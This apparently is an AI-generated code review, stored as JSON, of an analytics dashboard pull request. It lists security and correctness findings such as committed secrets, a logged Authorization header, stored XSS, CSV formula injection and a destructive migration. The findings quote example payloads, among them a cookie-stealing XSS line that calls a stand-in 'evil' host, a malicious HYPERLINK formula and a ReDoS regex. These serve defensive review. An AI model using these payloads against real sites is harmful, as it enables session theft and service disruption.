@@ -1,0 +1,264 @@
+{
+  "review": {
+    "summary": "Analytics dashboard PR. The view-tracking endpoint, the export path and several spec'd acceptance criteria are broken or insecure: secrets are committed and shipped to the browser, the visitor key is taken from the request body, deduplication returns 400, the Authorization header is logged, comment excerpts are rendered as HTML (stored XSS), and a migration `down` drops the whole collection.",
+    "findings": [
+      {
+        "file": "server/src/configs/analytics.js",
+        "start_line": 2,
+        "end_line": 3,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Hardcoded secrets committed to the repo",
+        "rationale": "`EXPORT_SIGNING_SECRET` and `SEGMENT_WRITE_KEY` are committed as literals and look like live keys. This violates CLAUDE.md (\"Do Not: Hardcode secrets ... use `.env` files\") and AC-10.1 (\"No secrets, keys or tokens shall be committed\"). The in-file comment claiming it is a test fixture does not change the impact: the HMAC key that signs every CSV export is now public, so anyone can forge a valid `X-Export-Signature`. Move both values to `.env` and read them via `process.env`.",
+        "suggestion": "Delete the constants, read `process.env.EXPORT_SIGNING_SECRET` at use time, and rotate both keys."
+      },
+      {
+        "file": "client/src/components/admin/analytics/ExportButton.jsx",
+        "start_line": 5,
+        "end_line": 5,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Client imports a server module, bundling the signing secret into the browser",
+        "rationale": "`import { EXPORT_SIGNING_SECRET } from '../../../../../server/src/configs/analytics.js'` crosses the client/server boundary forbidden by CLAUDE.md and AC-10.1 (\"Client code shall never import from `server/`\"). The secret ends up in the shipped JS bundle, readable by any visitor, and the guard it feeds is dead code: the imported constant is always truthy, so `if (signature && !EXPORT_SIGNING_SECRET) throw` can never fire. Remove the import and the check entirely.",
+        "suggestion": "Drop the import; verify exports by parsing the CSV locally if any client check is needed."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 655,
+        "end_line": 655,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Visitor key is taken from the request body instead of being derived server-side",
+        "rationale": "AC-6.3 requires the key to be `sha256(ip + user-agent)` or `sha256(X-Visitor-ID)` computed on the server and states the request body shall NOT be able to set it. Here `req.body.visitorKey` is used verbatim and is even mandatory (400 if absent). A caller can therefore send `{\"visitorKey\":\"<random>\"}` on every request, defeating the 24h deduplication (AC-6.5) and inflating view counts arbitrarily. Note `server/src/utils/viewTracking.js` already implements the correct `computeVisitorKey(req)` but is never imported by the route or controller.",
+        "suggestion": "Delete the body read and derive the key with `computeVisitorKey(req)` (hash the value before storing)."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 693,
+        "end_line": 699,
+        "severity": "CRITICAL",
+        "category": "correctness",
+        "title": "Duplicate view returns 400 instead of 200",
+        "rationale": "AC-6.5: on a duplicate the endpoint \"shall respond `200` without creating a new document. Deduplication shall never surface as an error to the client.\" The code returns `sendError(..., VIEW_ALREADY_RECORDED, HTTP_STATUS.BAD_REQUEST)`. A second page load within 24h by the same visitor now surfaces as a failed request (error toast / failed job), which the spec explicitly forbids.",
+        "suggestion": "Return `sendData(res, { message: SUCCESS_MESSAGES.VIEW_RECORDED })` when a recent view already exists."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 708,
+        "end_line": 708,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Authorization header written to logs",
+        "rationale": "`console.log('[analytics] auth header:', req.headers.authorization)` writes the raw Bearer token to stdout on every view request. AC-10.2 states \"Authorization headers and tokens shall never be written to logs\"; anyone with log access (or CI output) can replay the admin JWT for 7 days. Remove the log line.",
+        "suggestion": "Remove the console.log."
+      },
+      {
+        "file": "client/src/components/admin/analytics/tables/RecentCommentsTable.jsx",
+        "start_line": 48,
+        "end_line": 48,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Comment excerpt rendered as HTML — stored XSS in the admin panel",
+        "rationale": "`dangerouslySetInnerHTML={{ __html: truncate(item.contentExcerpt, 50) }}` renders comment content as markup. Comment text is attacker-controlled (posted through the public `POST /api/blog/add-comment` endpoint), and the server never strips tags (`analyticsController.js:519-528` just slices the raw string), so a comment such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes in the admin's browser when the Analytics page loads. AC-4.3 explicitly requires \"a plain-text excerpt ... (HTML tags stripped, never rendered as HTML)\". The `// keep formatting` comment shows the intent is wrong.",
+        "suggestion": "Render `{truncate(item.contentExcerpt, 120)}` as text and strip tags server-side in `getLastComments`."
+      },
+      {
+        "file": "server/migrations/20260211000001-add-blogview-indexes.js",
+        "start_line": 39,
+        "end_line": 39,
+        "severity": "CRITICAL",
+        "category": "correctness",
+        "title": "Migration `down` drops the collection, destroying all view data",
+        "rationale": "`await db.collection('blogviews').drop()` deletes every BlogView document, not just the indexes created by `up`. AC-10.3: \"Every migration shall be reversible: `down` restores the previous schema **without deleting data**.\" Rolling back this migration silently wipes all analytics history.",
+        "suggestion": "Use `db.collection('blogviews').dropIndexes()` or `dropIndex('<name>')` for the three indexes created in `up`."
+      },
+      {
+        "file": "client/vite.config.js",
+        "start_line": 12,
+        "end_line": 14,
+        "severity": "CRITICAL",
+        "category": "security",
+        "title": "Entire build-time environment inlined into the client bundle",
+        "rationale": "`define: { 'process.env': JSON.stringify(process.env) }` replaces every `process.env` reference in client code with the whole environment object, so any variable present in the build environment (`JWT_SECRET`, Gemini/API keys, DB URIs, CI secrets) is inlined into the shipped JS and readable by any visitor. This is unrelated to the analytics feature and is the same class of leak as the committed key above.",
+        "suggestion": "Remove the `define` block; expose only explicit `import.meta.env.VITE_*` values that are safe to publish."
+      },
+      {
+        "file": "client/src/components/admin/analytics/KpiSection.jsx",
+        "start_line": 17,
+        "end_line": 19,
+        "severity": "CRITICAL",
+        "category": "correctness",
+        "title": "KPI section polls every 30s and never clears the interval",
+        "rationale": "`useEffect(() => { setInterval(refetch, 30000) }, [refetch])` introduces background polling, which AC-10.5 explicitly forbids (\"Data shall load on page open and on filter change only; there shall be no background polling\"). The effect also returns no cleanup, so every remount (or every change of `refetch`) stacks another interval that keeps firing `refetch` on an unmounted hook.",
+        "suggestion": "Delete the effect entirely."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 710,
+        "end_line": 710,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Views by `author` tokens are not flagged as admin views",
+        "rationale": "AC-6.6: a view is an admin view when the JWT role is `admin` **or** `author`. Only `decoded?.role === 'admin'` is checked, so an author browsing their own published post creates a normal view that is counted in every statistic (`server/src/utils/viewTracking.js:66` does it correctly with both roles, but that file is unused).",
+        "suggestion": "Check `decoded?.role === 'admin' || decoded?.role === 'author'`."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 343,
+        "end_line": 343,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Views-by-category returned in ascending order",
+        "rationale": "AC-3.5 requires the horizontal bar chart sorted highest→lowest and states the order shall come from the API. `{ $sort: { views: 1 } }` sorts ascending, so the API returns the reverse of the contract. The client hides this by re-sorting (see the next finding), but any other consumer of `/views-by-category` gets the wrong order.",
+        "suggestion": "Use `{ $sort: { views: -1 } }`."
+      },
+      {
+        "file": "client/src/components/admin/analytics/charts/ViewsByCategoryChart.jsx",
+        "start_line": 34,
+        "end_line": 34,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Client re-sorts the views-by-category response, which AC-3.5 forbids",
+        "rationale": "AC-3.5: \"The order shall come from the API response (the client shall not re-sort).\" `[...data].sort((a, b) => (b.views || 0) - (a.views || 0))` re-sorts in the client. It masks the server-side ascending sort bug above; if the server is fixed and the client sort removed, ordering stays correct, but as written the contract is violated and the masking hides regressions.",
+        "suggestion": "Render `data` as received and fix the server sort."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 100,
+        "end_line": 102,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Avg Engagement computed from views instead of comments",
+        "rationale": "AC-2.4 defines Avg Engagement as \"the average number of comments per published post in the period\". The code computes `totalViewsCur / publishedCount` (views per post). With 500 views and 10 published posts the card shows 50 — and `KpiSection.jsx:64` appends a `%`, so it renders as \"50%\", which is neither the spec'd metric nor a percentage.",
+        "suggestion": "Divide `totalCommentsCur` by the published-post count and drop the `%` suffix in `KpiSection.jsx:64`."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 109,
+        "end_line": 118,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Most Active Category counts posts, not non-admin views",
+        "rationale": "AC-2.6 requires the category with the most (non-admin) **views** in the period. The aggregation groups `Blog` documents by category and ignores `BlogView` completely, so a category with one heavily-viewed post loses to a category with several unviewed ones. The card's secondary text also reports `${count} posts` (`KpiSection.jsx:78-80`).",
+        "suggestion": "Aggregate `BlogView` with `isAdminView:false` + date range, join to the blog category, and take the top group."
+      },
+      {
+        "file": "client/src/hooks/api/queries/useAnalytics.js",
+        "start_line": 13,
+        "end_line": 13,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "KPI cards do not re-fetch when the category filter changes",
+        "rationale": "`useAnalyticsKpis` passes `dependencies: [period, from, to]` while the other eight hooks pass `[period, from, to, category]`. AC-5.3 requires **every** section to re-fetch when the period *or the category* changes; selecting a category (or clicking a donut segment, AC-3.6) leaves the KPI cards showing all-category numbers while the charts update.",
+        "suggestion": "Add `category` to the dependency array."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 577,
+        "end_line": 584,
+        "severity": "WARNING",
+        "category": "security",
+        "title": "CSV export does not neutralise spreadsheet formula injection",
+        "rationale": "AC-5.6 requires any cell starting with `=`, `+`, `-` or `@` to be prefixed with a single quote. `escapeCSV` only quotes cells containing `,`, `\"` or a newline, so a blog title of `=HYPERLINK(\"http://evil\",\"click\")` is written verbatim and evaluated by Excel/Sheets when the exported file is opened.",
+        "suggestion": "Prefix `=`, `+`, `-`, `@` (and tab/CR) cells with `'` before the existing quoting logic."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 539,
+        "end_line": 545,
+        "severity": "WARNING",
+        "category": "performance",
+        "title": "CSV export issues two queries per blog",
+        "rationale": "AC-10.4 requires each analytics endpoint to issue \"a bounded number of database queries independent of the number of posts (aggregations, not per-post queries)\". `exportCsv` loops over `blogs` and runs `BlogView.countDocuments` plus `Comment.countDocuments` inside the loop, i.e. 2×N round-trips — with the 18 seeded posts that is 36 queries, and it scales linearly with content.",
+        "suggestion": "Run two aggregations (`$group` by blog) and merge the results in memory."
+      },
+      {
+        "file": "client/src/utils/formatters.js",
+        "start_line": 33,
+        "end_line": 37,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "formatShortDate uses the browser locale",
+        "rationale": "AC-1.3 requires dates and numbers to be formatted `en-US` regardless of browser locale. `toLocaleDateString(undefined, ...)` uses the browser default, so a German browser renders `11. Feb. 2026` instead of `Feb 11, 2026` in the Top Viewed / Recent Comments tables. (`formatNumber` on line 28 does pass `'en-US'` correctly.)",
+        "suggestion": "Pass `'en-US'` as the first argument."
+      },
+      {
+        "file": "server/src/validators/analyticsValidator.js",
+        "start_line": 13,
+        "end_line": 13,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Custom range `to` date is not inclusive of that day",
+        "rationale": "AC-5.4: \"views recorded at any time on that calendar day (UTC) shall be counted\". `parseDate` builds `new Date(str + 'T00:00:00.000Z')`, and the controllers filter with `$lte: to`, so for `from=2026-02-01&to=2026-02-11` every view after `2026-02-11T00:00:00Z` on the 11th is dropped — the last day is effectively excluded (and the drill-down day range at `analyticsAggregations.js:97` shows the intended end-of-day handling).",
+        "suggestion": "Set `to` to `23:59:59.999Z` of that day when parsing the `to` parameter."
+      },
+      {
+        "file": "server/src/middleware/rateLimiter.js",
+        "start_line": 42,
+        "end_line": 42,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Global API rate limit raised from 100 to 300 req/min",
+        "rationale": "AC-6.7 states \"The existing global API limit (100 req/min) shall remain unchanged\" and §11 lists \"Changes to global rate limits\" as out of scope. Raising the limit to 300 triples the abuse budget for every public endpoint (including `POST /api/blog/add-comment` and the login route's shared budget) to accommodate a client that fires ~9 parallel requests.",
+        "suggestion": "Revert to 100 and, if needed, exempt only the analytics endpoints."
+      },
+      {
+        "file": "server/src/routes/blogRoutes.js",
+        "start_line": 24,
+        "end_line": 24,
+        "severity": "WARNING",
+        "category": "security",
+        "title": "View-tracking endpoint has no dedicated rate limit",
+        "rationale": "AC-6.7 requires `POST /api/blog/:blogId/view` to have its own limit of 30 requests per minute per IP. The route is registered with no limiter, so the endpoint that writes a `BlogView` document per request (and, per the visitorKey bug above, is trivially callable in a loop) is limited only by the global limiter — which this PR just raised to 300/min.",
+        "suggestion": "Add a `viewLimiter` (30/min) middleware to the route."
+      },
+      {
+        "file": "client/src/components/admin/analytics/KpiCard.jsx",
+        "start_line": 35,
+        "end_line": 35,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Trend is still shown for the all-time period",
+        "rationale": "AC-2.7: \"WHEN the period is **all time**, the trend shall be hidden.\" Nothing suppresses it: for `period=all` the validator sets `from = new Date(0)` (`analyticsValidator.js:41`), `getPreviousPeriod` derives a previous window ending in 1970, and the controller still emits `trend: calculateTrend(...)` (`analyticsController.js:121-124`). Since previous ≈ 0, the card renders an \"↑ 100.0% vs previous period\" for all time, exactly what the AC forbids.",
+        "suggestion": "Return `trend: null` for the all-time period and/or gate the render on `period !== 'all'`."
+      },
+      {
+        "file": "client/src/pages/admin/Analytics.jsx",
+        "start_line": 60,
+        "end_line": 68,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Drill-down keeps stale responses from earlier buckets",
+        "rationale": "AC-3.7 requires the earlier response to be discarded when the user closes the drill-down or clicks another bucket before the previous request completes. `handleDrillDown` fires an un-cancellable request and always applies its result via `setDrillDown(prev => ({...prev, posts: res.data?.data ?? [], loading: false}))`. Clicking bucket A then B quickly means whichever request resolves last wins — if A resolves after B the modal lists A's posts under B's date — and closing the modal mid-flight still writes the posts into state.",
+        "suggestion": "Keep a request sequence token (or `AbortController`) and ignore responses whose token is not the latest."
+      },
+      {
+        "file": "server/src/controllers/analyticsController.js",
+        "start_line": 359,
+        "end_line": 361,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Unescaped user input used as a regex, and free-text search is out of scope",
+        "rationale": "`blogFilter.title = { $regex: req.query.search, $options: 'i' }` passes `req.query.search` straight into the query. §11 of the spec lists \"Search / free-text filtering of posts\" as out of scope for this PR, and an unescaped pattern such as `?search=(a%2B)%2B%24` can trigger catastrophic backtracking in the server-side regex engine (no timeout is configured), tying up the query thread. Any regex metacharacter also changes the semantics of the filter.",
+        "suggestion": "Remove the block; if search is kept later, escape metacharacters and cap the pattern length."
+      },
+      {
+        "file": "client/src/components/admin/analytics/KpiCard.test.jsx",
+        "start_line": 12,
+        "end_line": 14,
+        "severity": "WARNING",
+        "category": "correctness",
+        "title": "Required KpiCard test cases are skipped",
+        "rationale": "AC-9.1 requires unit tests covering `KpiCard` for trend arrow up / down / hidden. Both of those cases are `it.skip` stubs, and the only executing test asserts `expect(container).toBeTruthy()` — it would pass with the trend rendering removed entirely. The AC is therefore not met despite the file existing.",
+        "suggestion": "Implement the assertions (e.g. `getByText('↑')`, `getByText('↓')`, and no trend text for all-time)."
+      }
+    ],
+    "verdict": "request_changes"
+  },
+  "model": "deepseek/deepseek-v4.1-flash",
+  "tokensIn": 84190,
+  "tokensOut": 16802,
+  "costUsd": 0.01872845,
+  "ms": 82338,
+  "recordedAt": "2026-11-21T08:29:39.711Z"
+}
